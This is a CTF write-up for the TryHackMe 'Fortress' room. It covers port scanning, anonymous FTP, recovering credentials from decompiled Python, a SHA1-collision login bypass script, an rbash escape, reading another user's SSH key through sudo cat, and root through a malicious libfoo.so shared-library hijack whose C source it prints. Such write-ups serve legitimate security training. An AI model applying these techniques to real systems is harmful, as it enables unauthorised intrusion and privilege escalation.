# [TryHackMe](https://www.tryhackme.com) Room [Fortress](https://tryhackme.com/room/fortress)

## WriteUp/Notes


**Task 1  Introduction**

The box contains CTF-based challenges, to-be-solved in a story driven format. The good part is that story is not related to the hints and you can pull this off without reading through the story... So if you want to skip the boring part and dive right into hacking, you can feel free to.

The format of the story is divided into 3 chapters... With each part being revealed as you progress. Each chapter gives you a new challenge and in chapter 3 is where you fight the boss, so expect the obvious.

Hint: in this room there is no need to brute-force any user credentials.

Last but not the least... If you feel lost inside the maze, just believe that you're inside the fortress, fully-controlled by the evil-devil overlord. If I were you I won't believe everything I see. Remember: _Things are not always how they look like._ :upside_down:

**Task 2  Prepare for battle**

Welcome Chief, the fortress have been undertaken by the so-called overlords... Other clans have retreated their forces from the war observing how quickly they have patched up the weak-endings of the fort. Only you can save us now. Go in, hack the evil leader's fortress, the pacifists are counting on you...

  

Uhm, chief, make sure you set your radar to point to these mission endpoints:

  

`10.10.20.80   fortress`

`10.10.20.80   temple.fortress`

  

These are gonna help you get inside the fortress, but once you get in there you're gonna be on your own. "I will pray for you, chief", said the pilot.  

## Enumeration

#### Nmap scan Report

Nmap Full Ports Scan Report Result
```
$ nmap -p- $IP_Here

PORT     STATE SERVICE
22/tcp   open  ssh
5581/tcp open  tmosms1
5752/tcp open  unknown
7331/tcp open  swx
```

Nmap Common Script Scan Results

```
$ nmap -p 22,5581,5752,7331 -sC $IP_Here
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
|_  256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
5581/tcp open  tmosms1
5752/tcp open  unknown
7331/tcp open  swx
```

Nmap Aggressive Scan Report

```
$ nmap  -p 22,5581,5752,7331 -A $IP_Here

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
|_  256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
5581/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.186.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5752/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LANDesk-RC, LPDString, RTSPRequest, SIPOptions, X11Probe:
|     Chapter 1: A Call for help
|     Username: Password:
|   Kerberos, LDAPBindReq, LDAPSearchReq, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie:
|     Chapter 1: A Call for help
|_    Username:
7331/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## Conclusion
 **Total Open Ports:** `4`

2. **Port Number:** `22`,`5581`,`5752`,`7331`

3. **Services:** `ssh`,`ftp`,`Unknown`,`http`

4. **Services Versions:**  `OpenSSH 7.2p2`,`vsftpd 3.0.3`,`Unknown`,`Apache httpd 2.4.18`

5. **Operating System:** `Ubuntu`

## Enumeration

1. **Ftp Enumeration**

From the Nmap Aggressive Scan Report we can see ftp have anonymous login allowed so we can login to the ftp server using `anonymous` account using the following command
```shell
$ ftp $IpAdd_Here 5581
Name: anonymous
Password:
```
**Note: In anonymous account you don't need to give a password just press enter there or leave him empity**
When we use `ls -al` command there we can see there is two files there one is `marked.txt` and the other is hidden and its name is `.file`
![[fortress.ftp.png]]
We can download that file using the `get` command there like follows 
```ftp
$ get .file marked.txt
```
![[fortress.ftp.get.png .png]]
Above command download that files on our current directory where we open the ftp server.So now we have that files we can see the content of that files so now we can examine that files to see what is in there `.file` don't have any extension there so we can use `file` command on it to see what type of file is that like follows
```shell
$ file .file
```
This show us the file type of `.file` file and the other file have extension `.txt` so that means that file is a text file so we can see its content using `cat` command
![[fortress.ftpFiles.png .png]]
The text file have text on it but `.file` is a `python 2.7 byte-complied` that mean we have to decompiled it first so we can use [ uncompyle2](https://github.com/wibiti/uncompyle2) that `decompiles` that code so we can see what inside that code.We can do this with the following command
```shell
$ git clone https://github.com/wibiti/uncompyle2

$ cd uncompyle2

$ sudo ./setup.py install

$ ./scripts/uncompyle2 ../.file > decompiled.py
```
This will decompiled that code and stored its output to the file name `decompiled_backdoor.py`
![[fortress.ftpFilesDecompile2.png]]

![[fortress.ftpFilesDecompileContent.png]]
After Decompiling we can see their is `usern` and `passw` variable that have `bytes_to_long` encoded data so we have to decode that values to get the `usern` and `passw` value so we know that is encoded to `bytes_to_long` utility so we can decode it using `long_to_bytes` with the following python3 code
```python
from Crypto.Util.number import long_to_bytes 
username = "232340432076717036154994" 
password = "10555160959732308261529999676324629831532648692669445488"
print(long_to_bytes((usernameusername)))  
print(long_to_bytes((passwordpassword)))
```
After running that code we got the username and password values if every thing run fine 

```Credentials
Username: 1337-h4x0r  
Password: n3v3r_g0nn4_g1v3_y0u_up
```

2. **Port 5752 Enumeration**

So there is some service running on port 5752 but we could not get what type of service is running on that port so to get that we could use `netcat or nc` on it so probably we find something on it or we grab its banner.
to do that we can use the following command
```shell
$ nc $IpAdd_Here 5752
```
When we do that we see the following output
![[fortress.nc.png]]
So their we see we need `username` and `password` there we find credential on ftp enumeration so we can use that credential there and see if they accept that credentials or not.
![[fortress.nc.result.png]]
And they do so we got some output the but don't know 

3. **HTTP Enumeration**

Above we do enumeration of the service that got us some information that we need in future but now on we enumerate the web server that have a big attacking and  major attacking surface.In enumeration we found out that Target is using Apache web server.When we visit the main page of the site we confirm that also there because they have Apache default web page there
![[fortressHttppage.png]]

So it is the time for finding hidden directories the target contained in the server so we can find it using the following command 
```shell
$ ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.127.125:7331/FUZZ -e .php,.html,.js,.css -ic
```
There 
- `-w` is use to specify Wordlist
- `:FUZZ` is the keyword for `ffuf`
- `-u` is use to specify the target URL
- `FUZZ` is the keyword for `ffuf` to specify which place they have to fuzz
-   `-e` is use to specify the extension
-   `-ic` is use to ignore comments

and the output have the following things in it

```ffuf
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
assets                  [Status: 301, Size: 322, Words: 20, Lines: 10]
private.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
troll.html              [Status: 200, Size: 199, Words: 11, Lines: 12]
```

there we see `index.html` that we see above the `Apache` default page, `assests` is a directory that we don't access,`private.php` is a page that don't have any content in it they are just a blank page or required some additional things.And `troll.html` is a web page we can access but when we go there they show just a blank page with black background so when we see page source code there we see the following output
![[fortressHttppageTroll.png]]
there we see a message **This is not so easy** and there is also a link of **assests/style.css** that have some base64 encoded message.
When we decode that message using the following command syntax 
```shell
$ echo 'Base64 string here' | base64 -d
```
Output is like this 
![[fortressMessage.png]]
This does not give us any hint but why they write all the text in lower case except **COLLIDING** They are in upper case that is suspicious.

That's all we find right now nothing else and they are not enough for initial access.We find a string from `netcat` after successfully login to it what is that we don't know right now maybe they are HTTP hidden directory we can find this also using `ffuf` we have to do is make a file that have string we find from `netcat` and use that as a wordlist like follows
```shell
$ echo 't3mple_0f_y0ur_51n5' > tample.txt
$ ffuf -u http://10.10.238.81:7331/FUZZ -w tample.txt:FUZZ -e .php,.html,.js,.css
```
and the output is like following
![[fortress_tampleofsins.png]]
So this is a hidden directory with two extension `html` and `php`
`.html` is like this 
![[fortress_tampleofsins.html.png]]
There source code have interesting thing.They comment out a `php` there 
![[fortress_tampleofsins.htmlSource.png]]

Lets see `.php` one page.That page have nothing just a black background when i see its source code that also have some interesting thing
![[fortress_tampleofsins.php.png]]

They comment out some login forum that use  GET Request Method.

After reading the `php` code we came to know They get input from user about `username` and `password` and save it in a variable `test1` and `test2` and encode it in hex using `bin2hex` and compare that using `if-else` statement but we focus on the following condition
```php
 else if (sha1($test1) === sha1($test2)) {
      print "<pre>'Private Spot: '$spot</pre>";
    }
```

So basically they compare `test1` variable with `test2` if they have same sha1 hash then they will print private spot with `spot` variable values don't know what they have right now. But we could not use same username and password because of the first condition
```php
 if ($test1 == $test2) {
        print 'You can't cross the gates of the temple, GO AWAY!!.';
    }
```
so we have to pass two different username and password values but how two different values have same hashing because **hashing is a thing to compress any data in a fix number of length but two different files or data don't have same hash** That's the rule for hashing but for sha1 its a thing.SHA1 have a vulnerability that two different files have same sha1 hash when googling about it found that video useful to learn more about SHA1 collision attack 
[SHA1 Collision Attack](https://www.youtube.com/watch?v=Zl1TZJGfvPo) 
So now i know why **/assets/style.css** file message write **COLLIDING** in upper case letters 

So Now we have to do to send two different files as a GET parameters of username and password that have small size because of the following conditions

```php
else if(strlen($test2) <= 500 and strlen($test1) <= 600){
    	print "<pre>Nah, babe that ain't gonna work</pre>";
    }
```
we have to keep this in mind also.So we have to send a small hash collision file that have small size but have same sha1 hash so i found this site useful for this 
[sha-mbles.io](https://sha-mbles.github.io/). This site have two message files  
![[fortress_Shambles.png]] that have same sha1 hash and have small size also
![[fortress_ShamblesHash.png]]. 
So now we have the files so we can use that but now the problem is how we send that files in server so i use python3 request method for that using the following code
```python3
import requests
import urllib.request, urllib.error, urllib.parse
username = urllib.request.urlopen("https://sha-mbles.github.io/messageA").read();
password = urllib.request.urlopen("https://sha-mbles.github.io/messageB").read();

r = requests.get('http://10.10.238.81:7331/t3mple_0f_y0ur_51n5.php', params={'user': username, 'pass': password});
print(r.text)
```

In that code we request `messageA` and `messageB` file with its complete URL from [sha-mbles.io](https://sha-mbles.github.io/) and read that files and store its content to the variable name `username` and `password` and send it to the following link
```
http://10.10.238.81:7331/t3mple_0f_y0ur_51n5.php
```
with the GET parameter `user` for username and `pass` for password and when that code run they show us the following output
![[fortress_ShamblesHashKey.png]]
They give us a directory name that have the following things
![[fortress_SSHKey.png]]
So now we have the ssh private key for the `h4rdy` user so now we can copy that key in a file and make that private key with the permissions that only we can read it using the following commands
```shell
$ echo 'private key here' > h4rdy_rsa
$ chmod 600 h4rdy_rsa
```
So now we can get the initial access to the system

## Exploitation
As we have the `h4rdy` ssh private key so we can login to its user using the following command 
```shell
$ ssh -i h4rdy_rsa h4rdy@10.10.238.81
```
and now we got the initial access

when we use the `ls` command there we got the following errors
![[fortress_SSH4rdy.png]]
so this user have default shell is `rbash` that is a restricted shell so we can't use the many functions there but they have some bypasses when google it and found that method useful
![[fortress_rbash.png]]
So we have to do is to login again to `h4rdy` user using ssh but with the following command
```shell
$ ssh -i h4rdy_rsa h4rdy@10.10.110.53 -t "bash --noprofile"
```

So this give us regular `bash` but they don't have any `PATH` or `env` set so we have to do this on your own 
![[fortress_rbashbypass.png]]
There we use the following command to add the `PATH`
```shell
$ export PATH=/bin:/usr/bin
```
This add the `PATH` so now we can use the the commands like we do

## Privilege Escalation

So now we have to do Privilege escalation so we can start with `sudo -l` command and they show us the following output
```shell
Matching Defaults entries for h4rdy on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User h4rdy may run the following commands on fortress:
    (j4x0n) NOPASSWD: /bin/cat
```

So user `h4rdy` use `cat` command with `no password` as a `j4x0n` user and that's nice for us because if `h4rdy` don't have a `user.txt` flag so `j4x0n` does so we use the following command to `cat` that flag
```shell
$ sudo -u j4x0n cat /home/j4x0n/user.txt
```
So we can successfully see that flag that only `j4x0n` user does so now we can also see `j4x0n` ssh private key with this also 
```shell
$ sudo -u j4x0n cat /home/j4x0n/.ssh/id_rsa
```
![[fortress_jaxonkey.png]]
So now we have the `j4x0n` key also so we do the same step for `j4x0n` also
```shell
$ echo 'private key here' > j4x0n_rsa
$ chmod 600 j4x0n_rsa
```

```shell
$ ssh -i j4x0n_rsa   j4x0n@10.10.238.81
```
![[fortress_jaxon.png]]
And we got `j4x0n` also 

So now we can use `sudo -l` there also for easy privilege escalation vectors but they required password we don't have so we can `find` system `SUID` binaries using the following command
```shell
$ find / -perm /4000 -exec ls -al {} \; 2>/dev/null
```
and the output is like this 
```
-rwsr-xr-x 1 root root 615496 Jul 25 21:21 /usr/local/bin/sudo
-rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 May 27  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 84120 Apr 10  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 54256 Mar 27  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 20  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 32944 Mar 27  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40432 Mar 27  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 39904 Mar 27  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 Mar 27  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 32944 Mar 27  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 71824 Mar 27  2019 /usr/bin/chfn
-rwsr-sr-x 1 daemon daemon 51464 Jan 15  2016 /usr/bin/at
-rwsrwxr-x 1 root root 16696 Jul 26 12:55 /opt/bt
-rwsr-xr-x 1 root root 44680 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount
-rwsr-xr-x 1 root root 44168 May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount
-rwsr-xr-x 1 root root 40128 Mar 27  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 1000608 Apr 21 23:44 /sbin/ldconfig.real
```
there we see a binary name `/opt/bt` that's new binary when i run it to find what its does its a booby trap they show output like this 
```shell
Root Shell Initialized...
Exploiting kernel at super illuminal speeds...
Getting Root...
Bwahaha, You just stepped into a booby trap XP
```
and after that they crash your terminal so i warn you not start that binary now because you have to connect to the ssh again if you run it.
So i do `strings` on it using the command 
```shell
$ j4x0n@fortress:~$ strings /opt/bt

/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
puts
sleep
__cxa_finalize
__libc_start_main
libfoo.so
libc.so.6
GLIBC_2.2.5
u/UH
[]A\A]A^A_
Root Shell Initialized...
Exploiting kernel at super illuminal speeds...
Getting Root...
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
main.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
sleep@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

And this output show some binary that don't have any path or some libraries like `libfoo.so`,`libc.so.6` so when i use find command to find the path of that file i came to know  `libfoo.so` belong to `j4x0n`
```shell
$ find / -name libfoo.so -exex ls -al {} \; 2>/dev/null
```
so i made a malicious `libfoo.so` with the following procedure 
- first we have to make a binary name `libfoo.c` with the following code
```
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h> 
int foo() { 
setgid(0); 
setuid(0); 
system("/bin/bash"); 
}

```
- After that we have to compile that binary with the following command
```shell
$ gcc -fPIC -shared -o libfoo.so libfoo.c
```
They give us the file `libfoo.so` with malicious code
![[fortress_JaxonPri-EscBinaryLocation.png]]

Now we can copy that binary in that location using the following command

```shell
$ cp /home/j4x0n/libfoo.so /usr/lib
```
After that we run that binary and they give us root
![[fortressRoot.png]]

----------------

Special Thank to [A3r1t](https://tryhackme.com/p/Amrit456852) for Helping in this Room you can check out his Notes Also  from [A3r1t](https://github.com/A3r1t/CTF-Notes) there 